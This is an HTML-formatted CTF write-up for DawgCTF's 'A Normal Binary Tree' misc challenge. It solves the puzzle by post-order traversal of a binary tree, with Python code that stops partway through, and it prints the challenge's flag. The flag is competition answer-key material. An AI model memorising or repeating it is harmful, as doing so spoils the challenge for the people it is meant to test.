&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot;&gt;Misc&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;a-normal-binary-tree&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#a-normal-binary-tree&quot; aria-label=&quot;Anchor link for: a-normal-binary-tree&quot;&gt;A Normal Binary Tree&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_normalbinary.png&quot; alt=&quot;binary tree&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1QWC7HPg2llfFAFBZY9vntYazPfPY-Bg4&#x2F;view&quot; target=_blank&gt;problem.txt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, we need to build a binary tree with these nodes and the post order traversal of this binary tree will be the flag.&lt;&#x2F;p&gt;
&lt;p&gt;I tried many binary tree programs to do this in online, sadly no one works fine. So I went back to geeksforgeeks and learned binary tree from it and constructed the binary tree, traversed it by hand.&lt;&#x2F;p&gt;
&lt;p&gt;I used &lt;a href=&quot;https:&#x2F;&#x2F;kanaka.github.io&#x2F;rbt_cfs&#x2F;trees.html&quot; target=_blank&gt;this tool &lt;&#x2F;a&gt;to simulate the binary tree.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_normalbinary1.png&quot; alt=&quot;binary tree sim&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Noted the post order travesal of nodes in a list and printed the corresponding characters of it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;}&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;!&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;F&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;n&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;m&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;g&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;f&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;h&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;w&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;T&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;{&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;sorted_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;sorted&lt;&#x2F;span&gt;&lt;span&gt;(data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;lambda &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;: x[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;chars &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;([d[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;sorted_data])
&lt;&#x2F;span&gt;&lt;span&gt;ans &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;ans:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(sorted_data[i][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#DawgCTF{D0nt_m1ss_th3_f0rr3st!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Later I wrote this complete automated script which doesn&#x27;t need paper work by hand.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Node&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;value
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;left &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;right &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;insert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;node &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Node&lt;&#x2F;span&gt;&lt;span&gt;((value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;char))
